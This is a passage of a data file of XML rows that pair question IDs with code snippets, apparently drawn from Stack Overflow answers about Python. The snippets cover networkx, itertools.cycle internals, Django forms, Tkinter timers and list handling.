</snippet></ROW><ROW><id>12042333</id><snippet>n</snippet></ROW><ROW><id>12042333</id><snippet>&gt;&gt;&gt; [G.edges(component) for component in nx.connected_components(G.to_undirected()) if len(G.edges(component)) &gt; 0 and 'n' not in component]
[[('n4', 'n41')]]
</snippet></ROW><ROW><id>12042333</id><snippet>&gt;&gt;&gt; [k for k,v in G.out_degree().iteritems() if v &gt; 2]
['n', 'n1']
</snippet></ROW><ROW><id>12042957</id><snippet>jmetadata.py "\\Hal\hal free agent 1\backups\videos\" out.txt
</snippet></ROW><ROW><id>12042957</id><snippet>jmetadata.py "\\Hal\hal free agent 1\backups\videos" out.txt
</snippet></ROW><ROW><id>12042957</id><snippet>['\\\\Hal\\hal free agent 1\\backups\\videos" out.txt']
</snippet></ROW><ROW><id>12042957</id><snippet>"</snippet></ROW><ROW><id>12042957</id><snippet>"</snippet></ROW><ROW><id>12043063</id><snippet>urlize</snippet></ROW><ROW><id>12043380</id><snippet>itertools.cycle</snippet></ROW><ROW><id>12043380</id><snippet>static PyObject *
cycle_new(PyTypeObject *type, PyObject *args, PyObject *kwds)
{
    PyObject *it;
    PyObject *iterable;
    PyObject *saved;
    cycleobject *lz;

    if (type == &amp;cycle_type &amp;&amp; !_PyArg_NoKeywords("cycle()", kwds))
        return NULL;

    if (!PyArg_UnpackTuple(args, "cycle", 1, 1, &amp;iterable))
        return NULL;
    /* NOTE: they do not store the *sequence*, only the iterator */
    /* Get iterator. */
    it = PyObject_GetIter(iterable);
    if (it == NULL)
        return NULL;

    saved = PyList_New(0);
    if (saved == NULL) {
        Py_DECREF(it);
        return NULL;
    }

    /* create cycleobject structure */
    lz = (cycleobject *)type-&gt;tp_alloc(type, 0);
    if (lz == NULL) {
        Py_DECREF(it);
        Py_DECREF(saved);
        return NULL;
    }
    lz-&gt;it = it;
    lz-&gt;saved = saved;
    lz-&gt;firstpass = 0;

    return (PyObject *)lz;
}
</snippet></ROW><ROW><id>12043380</id><snippet>itertools.cycle([1,2,3])
</snippet></ROW><ROW><id>12043380</id><snippet>    /* taken from the "cycle.next" implementation */
    it = PyObject_GetIter(lz-&gt;saved);
    if (it == NULL)
        return NULL;
    tmp = lz-&gt;it;
    lz-&gt;it = it;
    lz-&gt;firstpass = 1;
    Py_DECREF(tmp);   /* destroys the old iterator */
</snippet></ROW><ROW><id>12043380</id><snippet>itertools.cycle</snippet></ROW><ROW><id>12043410</id><snippet>from foolib import *</snippet></ROW><ROW><id>12043410</id><snippet>__init__.py</snippet></ROW><ROW><id>12043410</id><snippet>bar</snippet></ROW><ROW><id>12043410</id><snippet>bar</snippet></ROW><ROW><id>12043410</id><snippet>foolib</snippet></ROW><ROW><id>12043410</id><snippet>bar</snippet></ROW><ROW><id>12043410</id><snippet>__init__.py</snippet></ROW><ROW><id>12043410</id><snippet>from bar import *
</snippet></ROW><ROW><id>12043410</id><snippet>bar</snippet></ROW><ROW><id>12043410</id><snippet>foolib</snippet></ROW><ROW><id>12043418</id><snippet>lis = ['fi', 'do', 'ca']

for item in lis:
   for name in glob.glob('*.html'):
      if item in name:
         with open(name) as k:
</snippet></ROW><ROW><id>12043418</id><snippet>list</snippet></ROW><ROW><id>12043418</id><snippet>&gt;&gt;&gt; names=glob.glob('*.html')
&gt;&gt;&gt; lis=['fi','do','ca']
&gt;&gt;&gt; for item in lis:
...    for name in filter(lambda x:item in x,names):
...         with open('name') as k:
</snippet></ROW><ROW><id>12043628</id><snippet>name</snippet></ROW><ROW><id>12043628</id><snippet>...
if form.is_valid():
    if "button1" in request.POST:
        # do things for form 1
    elif "button2" in request.POST:
        # do things for form 2
...
</snippet></ROW><ROW><id>12043628</id><snippet>name</snippet></ROW><ROW><id>12043628</id><snippet>country</snippet></ROW><ROW><id>12043628</id><snippet>interest</snippet></ROW><ROW><id>12043628</id><snippet>views.py</snippet></ROW><ROW><id>12043628</id><snippet>forms.py</snippet></ROW><ROW><id>12043751</id><snippet>plot</snippet></ROW><ROW><id>12043751</id><snippet>&gt;&gt;&gt; x, y = zip(*sorted((xVal, np.mean([yVal for a, yVal in zip(x, y) if xVal==a])) for xVal in set(x)))
&gt;&gt;&gt; x
(3, 4, 5, 6, 7, 8, 9)
&gt;&gt;&gt; y
(6.0, 5.0, 4.0, 3.0, 2.0, 1.0, 1.5)
</snippet></ROW><ROW><id>12043756</id><snippet>self.frame.after(500, self.updateBoard)</snippet></ROW><ROW><id>12043756</id><snippet>self.updateBoard</snippet></ROW><ROW><id>12043756</id><snippet>self.updateBoard()</snippet></ROW><ROW><id>12043756</id><snippet>after</snippet></ROW><ROW><id>12043781</id><snippet>python-bitbucket</snippet></ROW><ROW><id>12043781</id><snippet>from api import API
import datetime

    api = API("username", "**password**")
    repos = api.get_repositories()

    for repo in repos:
      print "Name: %s" % repo.name
      print "Owner: %s" % repo.owner
      print "Website: %s" % repo.website
      print "Description: %s" % repo.description
      print "Created on: %s" % datetime.datetime.strftime(repo.created_on, "%c")
      print "Language: %s" % repo.language
      print "SCM: %s" % repo.scm
      for issue in repo.get_issues():
        # Yes, this works too!
        print "Issue title: %s" % issue.title
        print "Issue priority: %s" % issue.priority
        print "Issue content:\n%s\n\n" % issue.content
      for change in repo.get_changesets(limit=5):
        print "Revision/Node: %d:%s" % (change.revision, change.node)
        # Since change.timestamp is a datetime object, we can use formatting on it.
        print "Timestamp: %s" % datetime.datetime.strftime(change.timestamp, "%c")
        print "Commit message:\n%s" % change.message
        print "Affected files: %s" % len(change.files)
        for f in change.files:
          print f.filename
        print "\n"
</snippet></ROW><ROW><id>12043968</id><snippet>^</snippet></ROW><ROW><id>12043968</id><snippet>**</snippet></ROW><ROW><id>12043968</id><snippet>8**3</snippet></ROW><ROW><id>12043968</id><snippet>512</snippet></ROW><ROW><id>12044013</id><snippet>for j in range(0,len(L)):
    i=L.index(L[j])
    if j == int(target):
        i=i//3
        return i 
</snippet></ROW><ROW><id>12044013</id><snippet>j == int(target)</snippet></ROW><ROW><id>12044013</id><snippet>findLine</snippet></ROW><ROW><id>12044013</id><snippet>None</snippet></ROW><ROW><id>12044013</id><snippet>L</snippet></ROW><ROW><id>12044013</id><snippet>  for i in range(0, len(prog)):
     L=L+prog[i].split()
</snippet></ROW><ROW><id>12044013</id><snippet>['10', 'GOTO', '20', '20', 'END']</snippet></ROW><ROW><id>12044013</id><snippet>  for i in range(0, len(prog)):
     L.append(prog[i].split()[0])
</snippet></ROW><ROW><id>12044013</id><snippet>L</snippet></ROW><ROW><id>12044013</id><snippet>['10', '20']</snippet></ROW></DATA>